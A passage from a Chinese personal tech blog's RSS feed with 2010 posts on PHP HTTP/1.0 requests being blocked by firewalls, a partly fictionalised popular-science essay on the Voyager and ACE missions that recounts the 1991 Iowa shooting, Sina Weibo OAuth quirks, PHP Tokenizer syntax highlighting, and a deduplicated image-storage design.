src="http://rss.soulogic.com/track/413" /></p>]]></description></item>
<item><title>由于 HTTP request 不规范导致的被防火墙拦截</title><link>https://soulogic.com/archives/412</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.412</guid><pubDate>Thu, 30 Dec 2010 19:02:56 +0800</pubDate><description><![CDATA[<p>这个问题其实是刘涛发现的，我只是整理一下</p><p>一段程序在本地调试正常后，放到网上却时断时续，最后确认问题如下</p><p>1. HTTP request 中的 <span class="monospace">Host:</span> 段是 HTTP 1.1 规范，在 1.0 中没有这个</p><p>2. 但是目前通常环境中（我用的 Ubuntu，不过其他发行版应该也有这问题），PHP 中的一些函数如 <a href="http://php.net/manual/en/function.file-get-contents.php">file_get_contents</a> 会发送错误的 request</p><p>例如只是这么简单的一行</p><ol class="php phpless"><li><span><span class="string">file_get_contents</span>(<span class="constant_encapsed_string">'http://www.163.com'</span>);</span></li></ol><p>发送的头两行是</p><blockquote class="code"><p>GET / HTTP/1.0<br />Host: www.163.com</p></blockquote><p>3. 有些防火墙会把这些不规范的 HTTP 通信拦截掉：就算你用的机器没设置 iptable，通常机房本身都会有硬件防火墙的</p><hr /><p>昨天出现问题，是没料想到 <a href="http://pecl.php.net/package/oauth">PECL OAuth</a> 也是如此</p><blockquote><p><span style="font-weight: bold; font-family: '微软雅黑'">Update in 2010.12.31</span><br /><a href="http://huoding.com/">王博</a>对这个问题做了补充<br />1.在他的 CentOS 5.3 上，PECL OAuth 默认用的 HTTP 1.1<br />2.<a href="http://php.net/manual/en/oauth.setrequestengine.php">OAuth::setRequestEngine</a> 方法可以提供 OAUTH_REQENGINE_STREAMS 和 OAUTH_REQENGINE_CURL 两种不同方式，后者就可以避免上述问题了。</p></blockquote><p>解决方法有很多种，不过为了代码最大适应性（就像为什么现在大家都不用短标签 &#60;? 一样），我觉得不要使用 file_get_contents 获取远程数据（在该函数的官方页评论里，你会看到各种各样的相同功能的<a href="http://www.php.net/manual/en/function.file-get-contents.php#82255">封装</a>）<span style="text-decoration: line-through;">、弃用 PECL OAuth </span>比较好，虽然随着时间的流逝这个问题最终会被修正</p><p>编译也可以解决，我在虚拟机了编译了份 <span class="monospace">./configure --disable-all --with-curl <span style="font-weight: bold; font-family: '微软雅黑'">--with-curlwrappers</span></span>，确认发的是 HTTP 1.1 了，但 with-curlwrappers 参数的解释是 <span style="font-weight: bold; font-family: '微软雅黑'">EXPERIMENTAL</span>: Use cURL for url streams</p><p>第一次见如何用 tcpdump，在调试这个问题时，可以用</p><blockquote class="code"><p>sudo tcpdump -A host www.163.com and &#39;tcp[20:4] = 0x47455420&#39;</p></blockquote><p>前者是监听的域名，“and”后面的大概可以理解为条件 <span class="monospace">substr($line, 20, 4) == pack(&#39;H*&#39;, &#39;47455420&#39;)</span></p><p><img src="http://rss.soulogic.com/track/412" /></p>]]></description></item>
<item><title>那是连风都不曾抵达的地方 那是连太阳都无法温暖的角落</title><link>https://soulogic.com/archives/411</link><author>zhengkai@gmail.com (郑凯)</author><category>记事本 Notebook</category><guid>soulogic.blog.411</guid><pubDate>Thu, 30 Dec 2010 17:47:32 +0800</pubDate><description><![CDATA[<p>忽悠性质科普文。对文章内容不负责任（除了卢刚部分）。科学理论方面的内容都是真实的。至于那些故事，恩，就当是在平行宇宙中发生的好了。</p><h2>（一）</h2><p>不知道各位玩过一个电脑小游戏没有。游戏是这样的，一个场景中，充满着不同方向的引力场和斥力场。游戏者在某个特定点发射一个小球。通过选择特定的发射角度与发射方向，小球就会在屏幕上翻转盘旋，划着奇异的轨道滑向某个终点。<br />我想，1963年的 Edward.C.Stone 一定是玩过这个游戏的。或许这正是他闲暇之余设计的一个小程序。<br />那时，他还是芝加哥大学的一个研究生，工作之一是计算某些卫星的发射轨道。在一次计算中，他惊讶地发现，当太阳系行星排列成某些特殊形状的时候，它们的引力就可以不断地为经过它们周边的物体加速。<br />进一步的仔细计算表明，这种事情每大约175年才会发生一次，而这种免费午餐式的摇摆变轨加速，能在当时的条件下，用大约十二年时间，就到达原本需要花费三十年时间才能到达的海王星。<br />而下一次这种时机的来临，是 1977 年。</p><h2>（二）</h2><p>有诗云，一万年太久，只争朝夕。只是科学的归科学，剩下的全归钱。不要说一万年太久，就是一十二年朝夕必争，也没有一个机构肯下这种本钱。卫星上了天，不是说就算完事了，地面控制要钱，地面数据接收要钱，一个不小心卫星出状况了，抢救要钱——说是抢救，其实无非是转着圈儿搜卫星信号而已，宛若大海捞针——闲话少说，总之，啥都要钱，没有人会在一个一飞十二年花钱如流水而且随时都会跟别的男人跑掉的娇宝贝身上下注。<br />怎么办？只能把野心藏起来。我们根本没有去海王星的打算，但是，这摇摆变轨加速，可不只缩短去海王星的时间呐。它同样可以让去木星土星的时间，缩短到只需三到四年。<br />于是，小心翼翼地，科学家们在六十年代中期，紧跟着一系列成功的水手号卫星之后，提出说，既然我们的水手们如此成功，探测了火星、金星和水星，为什么不也去木星看看呢？就当是这个计划的延续好了。<br />NASA 答应了，便有了水手计划之木星土星特航，分别叫做水手一十一号，和水手一十二号。<br />司马昭之心，路人皆知。哪里有什么水手的延续。很快，琵琶就被扔掉了，而半边夜叉脸也露了出来。这个计划被改名叫做旅行者计划，理直气壮地要一直飞向土星。<br />当时，人类还从未近距离拍摄过这两颗行星。在太空竞赛这个大环境的支撑下，计划同样通过了。而在计划的末尾，则约略提到，如果卫星够幸运够强大的话，或许，可以飞到海王星吧。</p><h2>（三）</h2><p>海王星？<br />这次，轮到NASA开始琢磨了。海王星？海王星在哪里？海王星到太阳的距离是土星到太阳距离的三倍，木星到太阳距离的六倍，以及地球到太阳距离的三十倍。这几乎已经飞出太阳系了！<br />啊！原来，我们还有这种指望啊……<br />人永远是不知足的，得到了一，还想得到二，而得到了二，就想得到三——得到了三，他就得到了万物。只是，这次 NASA 的兴奋与希冀，甚至超出了万物。<br />他们想和外星人取得联系。地球。太阳。太阳系。太阳系以外。外星人。<br />人生五十年，如梦似幻。七零年代的卡尔·萨根，正处在梦幻年华的黄金时刻。他刚刚在康奈尔大学走上了终生教职的道路，同时担任着 NASA 的顾问。在这之前，在他的推动之下，1972 年发射的先驱者11号和先驱者12号，已经携带上了画者人类男女图象的铝板，向着远方飞去。这次，看上去，又是一个机会啊。<br />于是，新的内容被追加进了这个旅行者计划：它将携带更充分的燃料——反正，烧二十年的电池和烧五十年的电池差不多重——然后，再加进一块金盘，录入人类的资料。这东西也不太重，而且，是个软媒介，技术要求不高，开发消耗就更少了。<br />看起来，有百利而无一害啊。<br />1972年，探测土星木星和它们的卫星，也说不定溜达到天王星海王星，顺带还有很小可能跑出太阳系的旅行者计划，被正式批准了。</p><h2>（四）</h2><p>花开花落，花落花开。转眼间，人类历史上的第一颗卫星已经发射了整整二十二年。而前辈强者，如范阿伦、钱德塞克诸人，也逐渐老去。当年的小伙子Edward Stone，现在已经是加州理工的教授了。旅行者一号和二号于1977年先后离开了地球母亲，三年之后的现在，她们已经双双飞过了木星，并有着诸多的发现，不光观测到了第一座地球之外的活火山，还为木星找到了三个迷途的孩子。在卫星中，她们算得上交际名媛，美名远扬。<br />而科学家们，则开始为新的卫星做出准备了。<br />“朋友，你想得到我的心么？”“当然。”“那么，请遵守四条原则，多，快，好，省。”<br />这大抵是NASA的官员对每一个前来拜访的科学家所说的话。既要让马儿跑，还不准多吃草。、<br />那么，只好赚外快，打野食。这次，Edward Stone 把他的小算盘，打到了太阳身上。<br />什么样的车最省油？<br />答案是不开的车。<br />在日地体系中，有五个引力平衡点。其中，离地球最近的那个，正好位于地球和太阳的连线上，靠近地球的这边。假如把一颗卫星送到这里，那么，就可以让它连续地观察太阳，而不需做出任何主动运动——在法向上，这是一个稳定平衡，日地引力将把这颗卫星带着绕日转动。它只需在切向上细微地调整自己的位置就好了。<br />NASA一定会喜欢这个计划的，Ed想，这些人虽然有钱，但是顿顿都吃能报销的公务餐。你越是抠门，就越对了他们的胃口。现在他要找的，只是一群好哥们。人多声势大，万言书远不如万人签名来得好用。<br />于是，在1980年的地球物理年会上，他找到了他的几个旧识与朋友，比如，旅行者计划的第一大脑，希腊人 Krimigis；他在加州理工的同事，Dick Mawaldt；还有新近在旅行者计划中崭露头角的研究员 George Gloeckler 和他在马里兰的同事，Glen Mason。<br />大家都有自己的绝活和自己的兴趣。几个人碰头一商量，不若数好合一好，把每个人的仪器凑到一起，组成一颗新卫星，放到这个日地引力平衡点处。<br />而这时，远在地球的另一面，George Gloeckler 未来最好的朋友，刚刚服完兵役，开始了他在马克思-普朗克实验室的研究员工作。</p><h2>（五）</h2><p>时钟开始迅速地再次向后拨动。这次，我们来到了 1990 年的 Iowa。<br />一十二年之前，Eberhard Moebius 还是一个小人物，他在波鸿大学拿到了自己的博士学位，然后去服了一年兵役。<br />而现在，四十二岁的他，在《自然》杂志上发表了论文，也拥有了属于自己的粒子飞行时间探测仪，已经是业内小有名气的研究者了。他有了自己的研究经费，更有了很多和他密切合作的朋友，其中和他关系最好的一位，是研究太阳风结构的 George Gloeckler。<br />于是，在邀请之下，他踌躇满志地踏上了美国的土地，来到了世界上空间物理最强的 Iowa 大学，希望在这里打出属于自己的一片天空。<br />但是事情并不令他满意。短短数天时间的互相考察之中，他觉得他并没有看到他想要的，一派欣欣向荣的学术气氛。相反，空气中搀杂着一些说不出的味道来。人与人之间，似乎多了点敷衍，少了些真诚。一边参观著名的范阿伦大楼，他一边与陪同者交流。令他最感到惊讶的是，当他提出说，他可以和其他教工共用以他申请到的经费购买的仪器时，得到的是冷冰冰的答复。<br />“不，我们这里不这么干。仪器是属于你自己的，何必要给别人用？”<br />尽管如此，他还是在这里交到了一些朋友，比如系主任德怀特·尼克尔森，甚至和他竞争同一个特殊教授职位的克里斯托佛·戈尔茨。<br />数月之后，Eberhard 同时接到了他的两位好友，George Gloeckler 和 Martin Lee 的邀请，分别来自 Maryland 和 New Hampshire。而 Iowa 这边，与他联系的人，似乎始终和他有某些隔阂。<br />他最终去了 New Hampshire。在去 New Hampshire 之前，他最后造访了 Iowa 一趟，和尼克尔森与戈尔茨一起吃了顿饭。<br />“是啊，大家都只顾自己，从不合作。”尼克尔森感叹道：“但是我也没什么办法。事情变成这个样子，也不是一天两天能够解决的了。”<br />“他们是那里我见到的不多的真诚而友好的人。他们是例外。”多年以后，Eberhard 这样评价说。<br />戈尔茨最终得到了那个职位，他有两个学生，一个叫做卢刚，一个，叫做山林华。</p><h2>（六）</h2><p>1985 年，北京大学本科毕业生卢刚，来到了 Iowa 大学，修读空间物理博士。他选择了克里斯托佛·戈尔茨作为他的导师。他的物理基础很好，选择的课题也是理论性很强的电磁等离子体基础研究。<br />1986 年，中国科技大学本科毕业生山林华，也来到了美国。他一开始就读的是德克萨斯农机大学。1987 年，他转入 Iowa 大学，并同样选择了戈尔茨作为导师。山林华的研究方向是戈尔茨的另外一个主攻方向，木星的磁场研究。<br />经过木星的卫星并不多。在当时，主要的数据来源，仍然是 1979 年经过那里的两颗旅行者卫星。这同样也成为了山林华的研究的主要依靠。<br />山林华和卢刚后来在博士资格考试中，并列获得了第一名。<br />1990 年，卢刚以第二作者的身份，发表了他的第一篇，也是唯一一篇论文。<br />1990 年末，山林华博士答辩成功，他利用旅行者卫星研究的木星光环电磁效应的课题，取得了圆满成功，并得到了教授们的一致好评。旅行者的数据是独一无二的，山林华的研究，同样是独一无二的。教授们把这篇论文评为当年的优秀博士论文。<br />1990 年末 1991 年初，山林华获得了 Iowa 大学的一个博士后职位，他仍然在戈尔茨手下工作。<br />1991 年 1 月，山林华的第一篇论文发表在《天体物理杂志》上，研究方向同样是木星光环。山林华是第一作者。<br />1991 年 2 月和1991年8月，山林华又以第一作者的身份连续发表了两篇文章。这两篇文章则转入了基本等离子体研究，讨论了地球的磁场扰动。<br />1991 年 5 月，卢刚试图博士毕业，但是并没有通过初审。他的第二次答辩终于通过了。可惜，他希望留在美国，却并没有找到稳定的工作。<br />1991 年 11 月 1 日，周五，下午 3 点。卢刚在研讨会进行的过程中，先后开枪射杀了他的导师，戈尔茨，和组中的副教授史密斯，接着他开枪打死了山林华。他离开了组会房间，下到 2 楼，射杀了系主任尼克尔森。最后他来到行政大楼，打死了副校长克黎利，重伤当时在场的一名本科生学生助理，随后饮弹自尽。<br />从此，范阿伦大楼里，多了几分森森鬼气。而 Iowa，这个之前高高在上的空间物理研究者们的圣地，也一蹶不振，泯然众人。<br />1993 年 5 月，以戈尔茨、山林华和史密斯为第一、第二、第三作者的论文发表在领域内最好的杂志，《地球物理研究》上。这也是山林华为科学作出的最后的贡献。</p><h2>（七）</h2><p>二十年弹指一挥间。曾几何时，岁月爬上了小伙子的头，爬上了姑娘的腰。曾几何时，往日的英姿飒爽，已变得老成持重。六十岁的 Edward Stone，已经做过了加州理工数学、物理和空间学院的院长，继而在前任辞世之后，担任起了旅行者计划的主要科学负责人。而两位旅行者，已经远远超过了人们的期待。</p><p>旅行者一号，于 1980 年掠过土星。在远远地对土卫一进行预观测之后，研究人员决定对她进行改道，让她对土卫一作出详细观测，不再经过天王星与海王星。而旅行者二号，则成为了迄今为止，天王星和海王星的唯一人造访客。<br />在卢刚夺去地球上最好的空间物理系的灵魂之前的 1989 年，旅行者们已经超额完成了她们的行星间观测，并成为了人类太空探索史上划时代的璀璨明珠。</p><p>然则，好事多磨。那颗原本要放在地日引力平衡点的卫星，虽然早在 1983 年，就在 Glen Mason 和 George Gloeckler 的主持下，正式提上日程，却迟迟没有获得批准。<br />直到又过了快十五年。<br />1997 年年底，卫星 ACE，在 Stone 的主持下，射入太空。这是真正属于Stone的第一颗深空探测卫星。</p><h2>（八）</h2><p>那是连风都不曾抵达的地方。<br />那是连太阳都无法温暖的角落。<br />那是寂寞的远处，太阳系的边缘。</p><p>十多年前，一群人曾经聚在一起讨论过，太阳系统的边界，是在什么地方。<br />据说，在很远很远的地方，太阳风会慢到音速以下，因此形成一个边界，叫做终止边界。这个边界再望外走，又走很远很远很远，星际粒子流将最终克服太阳风等离子体，而形成一个弓形冲击波。这个弓形冲击波的里边界，叫做氦球层顶。而这两个边界之间的地方，叫做氦鞘。它们共同构成了太阳系的最外围。<br />但是，没有人知道这套理论是否正确。更没有人知道，假如这套理论是正确的话，这两个边界又都在什么地方。<br />Just for fun，他们作了一个民意调查，五十多位科学家，每个人把自己的看法写在纸上。<br />结果大约是这样的：大部分人认为，终止边界会在地日距离的五十倍左右。小部分人认为可能达到六十倍，还有三四个人认为，可能有八十个日地距离那么远。<br />旅行者们孤独前行。</p><p>三年过去了。这些科学家在一起，又作了一次民意调查。这时，旅行者已经离太阳超过五十三倍日地距离了，什么都没有发生。<br />这次，大约有三分之一的人，对理论提出了怀疑。另一些人认为，七十到八十倍距离才是合理的。少数人说，或许能到九十倍吧。<br />而旅行者们继续孤独前行。</p><p>太阳的温暖越来越难以关照到这两位跋涉的旅人了。她们不得不开始更多地使用自身携带的化学放射电池。即使是这样，能量的供应也在逐渐减少。她们不得不勒紧裤带，节衣缩食。<br />1998年，光学成相设备被关掉了。她们失去了一只眼睛。<br />紧接着，2000年，旅行者2号的红外探测仪和紫外探测仪也被关掉了，她已经处于全盲的状态——旅行者1号还努力地半睁着她的紫外探测仪，为此，她不得不让她的左臂，太阳风等离子体观测仪停止工作。<br />2001年，太阳能电池板所提供的电力已经不足整个卫星供给的十分之一，她们难过地瘸了。<br />但是她们仍在跋涉。<br />2002年，旅行者2号的高效发射天线停止工作，从此她嘶哑了嗓子，靠着低效频段，以原来千分之一的速度发回数据。<br />地面观测人员开始动摇了：她们还能支撑多久？旅行者1号已经离太阳有九十个日地距离了，但是什么都没有看到。终止边界，氦球鞘层，氦球层顶——太空中静悄悄，什么也没有发生。只有日复一日，重复着的相同的数据。<br />人们终于决定，是时候放弃这两颗卫星了。她们已经垂垂老矣，或许，不再适合干什么重活了。</p><h2>（九）</h2><p>我们应该感谢什么呢？或许，科学最应该感谢的是官僚主义。官僚主义让科学推迟开始，但是也让科学推迟了结束。<br />就在层层审批之中，天际传来了波动。<br />2003 年 11 月，旅行者 1 号进入了终止边界。<br />审批停止了。大家张大了嘴。<br />这时，旅行者1号距离太阳整整九十四个日地距离。无人能料。<br />而在四年之后，2007 年 7 月，旅行者2号在八十七个日地距离处，在另一位置穿越了终止边界。<br />盖棺定论。理论是对的，尽管，还需要更多发展。<br />而旅行者们的生命，也数得到尽头了。化学放射电池不可能无休止地燃烧下去。顶多到2025年，旅行者上的最后一件科学设备也将停止运转。一切，都将归于平静。 </p><p>她们哪里是水性杨花的娇气小姐。她们是身残志坚，不离不弃，天赋异禀，功勋卓著，坚韧不拔，死而后已的奇女子。</p><h2>尾声</h2><p>2007年，ACE的陨落已经提上日程。连续不断的太阳粒子冲击让这位在航空公司、GPS公司和手机公司中信誉颇高的预言家不堪重负。<br />2012年，中国的夸父将走上日地引力平衡点，取代 ACE 的位置，继续它为地球干了一十五年的太阳风暴预测工作。<br />2006年，冥王星探测器“新地平线”号从佛罗里达起飞。<br />2009年，Eberhard Moebius 和他的同僚一起，发起了新一轮的太阳系边界探测计划——自旅行者出发之后，该计划在三十年之内被人反复提出，无一通过。<br />这一年，最早提出太阳风模型的 Parker 86岁。Gloeckler 76岁，已经几乎无法辨认哪怕是站在对面的人的相貌。Stone 71岁，已经有了两个孙子。Mason 67岁。Moebius 61岁。即使这个卫星计划最终获得通过，他们之中也只有最幸运的那些人，才能看到卫星到达目标的那一刻。</p><p>而人类历史上走得最长的旅行者们，仍在无声地滑向远方，继续着她们寂静的旅程。<br />或许，她们会继续她们的幸运，在遥远的时空中的某一点，被某种生物发现，找到自己完美的归属吧……</p><p><img src="http://rss.soulogic.com/track/411" /></p>]]></description></item>
<item><title>新浪微博的 OAuth 使用点滴</title><link>https://soulogic.com/archives/410</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.410</guid><pubDate>Mon, 13 Dec 2010 17:13:23 +0800</pubDate><description><![CDATA[<p>1. 本来以为写程序对程序的接口应该是非常愉快的事情，可实际上新浪微博的 api server 端写的非常糙，比方说在验证过程中，有一步我搞错了，导致提交时 oauth_signature 的值错了，但其他参数，包括顺序之类的都是正确的，可新浪返回的错误代码居然是 500，让我一度以为他们那边刚挂了还没好利索，后来才想起来用别的应用测一下都正常，才确认是我的问题，这种时候显然应该返回 4xx 错误啊。我以为考 HTTP 错误代码的百位 1 2 3 4 5 都属于哪个分类是最最基本的事情，不知道负责写 api server 端的这哥们是怎么混进新浪写程序的，虽然我能理解对于整个微博组来说，肯定是抓了个最烂的人来写这最不重要的功能，但这就导致了如果你不用官方提供的 SDK libweibo 就到处都是麻烦。包括让人啼笑皆非的 <a href="http://open.t.sina.com.cn/wiki/index.php/Help/error">错误代码</a>，首先，错误代码不是针对每个具体操作的，而是个 all in one 的总表，其次，非常乱，连个排序都没有（看看 400xx 那些数字吧），最后，他还不全，如果碰到个 40113 token_rejected 之类的错误，很大程度上你要靠巧合了，因为错误信息提供不了任何有用的反馈。</p><p>2. OAuth 设计本身已经包含了对参数的签名，保证了在 HTTP 通信的过程中，中间人只能看，不能篡改，但是在富有中国特色的贴图功能时，所上传的图片文件是没有签名的，Tim Yang 的回答是因为服务器的压力所以没有做，加之之前说过的 <a href="http://t.sina.com.cn/10503/k4CjGqRKT">OAuth 是典型的过度设计</a>，我估计 Tim Yang 说的过度设计可能就是指签名验证参数这部分。可能是觉得出事的几率小，最多也就是图片被多加个水印啥的。</p><p><img src="http://rss.soulogic.com/track/410" /></p>]]></description></item>
<item><title>看《有关时间旅行的热门问题》</title><link>https://soulogic.com/archives/409</link><author>zhengkai@gmail.com (郑凯)</author><category>记事本 Notebook</category><guid>soulogic.blog.409</guid><pubDate>Sun, 24 Oct 2010 01:46:14 +0800</pubDate><description><![CDATA[<p>非常不喜欢这个结局，应该是垂死的 Ray 拨倒杯子后，时间回到原点，人物记忆也理所当然的重置到初始状态，实际的时间线是 Ray 在三个人闲侃的时候碰倒杯子，弄湿了一张无关紧要的纸片，然后 Pete 亲手把那纸条无所谓的随手扔了，整个片子的剧情只是被破坏掉的一种假设，一个不存在的瞬间</p><p>在时间主线里每个瞬间都存在无数的可能，但只有一种可能会真实存在</p><p>三个人闲侃过后各回各家，默默无闻的终了一生，完全无法察觉那一瞬间存在着最终可以让他们走向永恒的那种假设，Pete 梦寐以求的“My one chance”</p><hr /><p>大蚂蚁也恨突兀，稍微讲点科学的都应该知道，所有有外骨骼的生物无法巨型化是由地球的重力加速度 9.8 m/s<sup>2</sup> 决定的</p><p>但也还是不错的片子了</p><p>你总不能要求所有的科幻片都像《这个男人来自地球》那样严谨到滴水不漏的程度</p><p>另外说一句不相干的，所有穿越片一旦用到平行宇宙就表示编剧败了，就像破解一个软件，如果做不出 keygen 只能给个 crack patch，就表示这个 cracker 败了一样</p><p><img src="http://rss.soulogic.com/track/409" /></p>]]></description></item>
<item><title>PHP 里用 Tokenizer 实现更好的 highlight_string</title><link>https://soulogic.com/archives/408</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.408</guid><pubDate>Fri, 03 Sep 2010 08:58:16 +0800</pubDate><description><![CDATA[<p>一个能有这么多用途的模块 <a href="http://php.net/Tokenizer">Tokenizer</a> 被我无视到现在，直到最近才醒过味来</p><p>比方说 PHP 代码高亮，一直用的 <span class="monospace">highlight_string</span>，可实际上这是一个非常粗糙的函数，只能区分四种颜色：default、string、keyword、comment，而用了 Tokenizer，（虽然没必要，但是）如果你愿意的话，可以标记出一百多种颜色</p><p>简单的代码实现如下：</p><p><a href="https://soulogic.com/upload/126">tokenizer.php</a></p><p>效果图片，左边是 PHP 页面，右边是我编辑器</p><p><img src="https://soulogic.com/upload/124" /></p><p>简单的说下过程：</p><p><span class="monospace">token_get_all</span> 把整个文件转成大数组后，每个 item 要么是基本符号（如 ; 和 = 之类的），要么是数组，下标 0 1 2 分别是 token id、原字符串、原始行号，其中 token id 可以用 token_name() 转回实体名，我将其显示为 <span class="monospace">&#60;span class=&#34;实体名&#34;&#62;原字符串&#60;/span&#62;</span>，以交给 CSS 来控制</p><p>其中需要注意一点，我认为 HTML 最合适的行号显示方式是 <span class="monospace">&#60;ol&#62;&#60;li&#62;</span> 标签，我见过一个 JS + CSS 的高亮控件，其行号是文本的，也就是说如果你直接鼠标划一段拷贝的话，会连行号一起拷上，如果不想这样就必须点最上面的 <span class="monospace">&#60;div&#62;</span> 画的拷贝按钮，虽然最终可以不拷贝行号了，但方式实在是别扭（就像 Flash 里没法右键一样恼人）。但基于 <span class="monospace">&#60;li&#62;</span> 的话就有个问题，需要你自己来处理转出来的 token 中的换行问题，需要写成两个 <span class="monospace">&#60;li&#62;</span> 而不是简单的在 <span class="monospace">&#60;li&#62;</span> 中加 <span class="monospace">&#60;br /&#62;</span></p><p>我的最终效果可以保证，当你在浏览器里看我那个 PHP 生成的 HTML 高亮代码的话，你直接 Ctrl + A Ctrl +C，得到的文本跟源代码是完全一致的，包括缩进。</p><p>代码只是个简单 demo，因为 token name 还需要自己来重新归类，例如我们在编辑器里设定高亮的时候只需要说，关键字是什么颜色，函数是什么颜色，而在这里你需要自己来找出哪些是<a href="http://php.net/manual/en/reserved.keywords.php">关键字</a>，你会在我的代码的结尾看到巨长的 CSS 选择。又或者如果需要区分内置函数和自定义函数，那肯定需要字典了。</p><hr /><p>关于缩进是另外一个话题，我认识的绝大部分人都是用 4 个空格代替缩进，这是让我非常疑惑的问题，除非按照 Pear 里那种傻逼的缩进规则外（如果 <span class="monospace">array(</span> 后有换行，则下一行不是比前一行多一个缩进，而是一直多到 array 的第一个字母 a 的位置，我见过由于过长的命名导致一个仅二维的数组就有五十多个空格做缩进），其他情况下缩进所代表的空格数无论怎么设都是一致的。用空格取代真正的缩进有点像用一张图片来取代 <span class="monospace">&#60;hr&#62;</span>——你本来可以在 CSS（编辑器）里设定它的表现的。当然，这个问题只有硬性规定，没有讨论结果的。就像 <a href="http://www.kernel.org/doc/Documentation/CodingStyle">Linux</a> 要求 tab，而 <a href="http://www.python.org/dev/peps/pep-0008/">Python</a> 建议4空格，可他们都很有影响力</p><p>我在代码里是额外对缩进加了层 <span class="monospace">&#60;span class=&#34;tab&#34;&#62;</span>，并定义样式 <span class="monospace">font-size</span> 是正常字体的一半，以控制它看起来像 4 个空格</p><hr /><p>其实是看到老王说到 <a href="http://hi.baidu.com/thinkinginlamp/blog/item/17476d22661ee6a94623e8d7.html">代码审计</a> 时才想起 Tokenizer</p><p>另外，如果 <a href="http://www.phpdoc.org">phpDoc</a> 能及时改用 Tokenizer 而不是自己解析字符串的话，就算更新缓慢，至少也能向后兼容 PHP 5.3 的代码了（只是新语法忽略，至少不会异常中止）</p><p><img src="http://rss.soulogic.com/track/408" /></p>]]></description></item>
<item><title>中等规模网站的UGC图片存放规划</title><link>https://soulogic.com/archives/407</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>adc267e42269b6ad4514b4f633dc01cb</guid><pubDate>Wed, 28 Jul 2010 15:55:19 +0800</pubDate><description><![CDATA[<p>先声明，本文借鉴了很多刘涛（Tarkus）和 Druggo Yang 的实战经验，特此感谢</p><hr /><p>好像现在是个网站就允许用户上传头像，其中一部分还允许上传相册、个性背景图之类的东西。对图片的规划各村都有各村的高招，这里只是抛砖引玉、提个醒：当文件膨胀到一定规模的时候再去改就来不及了，在一个项目的草创时期，让一个人多花两个星期的时间来琢磨这个“小”问题也绝对称不上是过度设计。</p><p>我对中等的定义：图片所占空间在 1T - 数十 T 之间。</p><p><span style="font-weight: bold; font-family: '微软雅黑'">功能需求</span></p><p>基本的就两点：排除重复，和可扩展性。</p><p>排重并不为很多人所重视，因为对很多人来说短期可以承受，实际经验重复的占了 50%（一些流行的图片会被重复上传很多次），但问题是这里还关系到另外一件事：审核。例如一些很流行的黄图会被频繁的被不同人重复上传，这也是不小的审核工作量。</p><p><span style="font-weight: bold; font-family: '微软雅黑'">具体设计</span></p><p>简单的说就是 MySQL 单点来保证唯一，将文件 MD5 转换为递增ID，再将固定数量的文件分成组，例如最简单的 MySQL 表可以这样。</p><blockquote class="code"><p>CREATE TABLE IF NOT EXISTS `upload_pic` (<br /> &#160;`id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,<br /> &#160;`hash` binary(16) NOT NULL,<br /> &#160;PRIMARY KEY (`id`),<br /> &#160;UNIQUE KEY `hash` (`hash`)<br />) ENGINE=MyISAM DEFAULT CHARSET=ucs2 AUTO_INCREMENT=1;</p></blockquote><p>每次有上传，先 MD5、INSERT，成功就返回 ID，失败就重新 SELECT 找以前的 ID</p><p>文件就是整个 ID 的补零切三段，如 12345 保存为实际的文件 /upload/000/012/345，不保留扩展名，统一发送 Header Content-Type application/octet-stream</p><p>首要原则是只新增，不改写（除了审核后删除的）</p><p><span style="font-weight: bold; font-family: '微软雅黑'">调优</span></p><p>上面所述只为了方便理解的最精简的方案，还有很多事情可以做。</p><p>用于发号的 MySQL 仅仅是写入单点，对于已经生成的 hash，可以定期生成 <a href="http://dev.mysql.com/tech-resources/articles/storage-engine.html">Archive 引擎</a> 的只读表。然后新上传时以 SELECT/INSERT/SELECT 的顺序获取 ID（这时候，第三步的 SELECT 是极其罕见的）。</p><p>如果是 nfs 挂载，初期可以挂整个 /upload，后期可以以一级子目录为单位，分散在不同机器上。如 /upload/001 和 /upload/002 挂在机器 A 上，诸如此类。这样我们可以每 M 个图片为一个挂载单位（下面简称 MU——Mounted Unit）。如果图片的平均大小是 200K 左右，则每个 MU 的平均大小应该在 1M * 200K = 200G 左右。由于内容不再改写，老的 MU 可以到处搬动、甚至分散到不同机房，其实是类似 flickr 的 farm*.static 子域名。</p><p>实际磁盘问题是个大问题，这方面网友 Druggo Yang 给了我很多经验，他最早面临的问题是大量随机读写、几乎没热点，大概是文件实在太碎，硬盘反倒在网卡之前成为瓶颈，银弹是有：SSD，不过太tmd贵了。最后他们是用的 LVS，那已经是我知识体系以外的东西了。</p><p>我想到的解决方法被 Druggo Yang 评价为自己做软 RAID：不同 MU 挂到不同盘，用 nginx 访问，或者系统本身瓶颈，那就若干个 Server 有相同的 MU，做轮询。但总之我不推荐做磁盘 RAID，这可能是我还没搞明白，也可能真的如此，就拿最简单的两块硬盘做 RAID 0 来说，按我的理解，每读一个文件的时候，两块磁盘都需要定位，而两块独立的磁盘却可以分别各定位一个文件，据说也会受磁盘控制器的限制，但大体上不影响我的我的结论：RAID 的优势应该在连续读写上，而随机读写反而会因为短板效应而略微降低 IOPS。总之这问题我只能纸上谈兵，有条件应该拿几块硬盘测一下的。</p><p>此外，诸如目录分级是 1000 还是 100 个文件一组，还是用其他进制，都可以细测。记得以前看过一个单目录文件数的 Benchmark，可惜后来再也找不到了（有谁能提示一下？），隐约记得 500 比较合适，因为这里需要频繁手工搬动，索性就弄个人脑容易识别的数了</p><p>另外为了防止遍历需要加个扰码，这也很容易了。</p><p>至于缩略图接口，另算</p><p><span style="font-weight: bold; font-family: '微软雅黑'">应用特例：头像</span></p><p>其实每个网站都有的图片机制是头像，现在普遍的规则是用户 ID + 补码，补码可以是更新次数（如 douban）、时间戳（如 t.sina）、文件名（如 twitter）之类的。补码的主要目的是为了靠改变 URL 而绕开 Header Expires</p><p>但直到上家公司的产品部门在全面模仿 Facebook 运动中，想要实现 Facebook 里的一个功能：所有图片的大一统，如新上传的图片进相册、可以将任意一张图片设为头像，而收藏功能的流程跟自己上传几乎是一样的，等等，虽然这个改动过于底层以至于辞职一年多后公司彻底黄掉也没能看到它实现，但我还是很喜欢这个大一统的：不去考虑一张图片被哪些地方引用，只管存就是了，而所有涉及到图片的地方，都保存的是图片 ID，因此只看某一张图片的 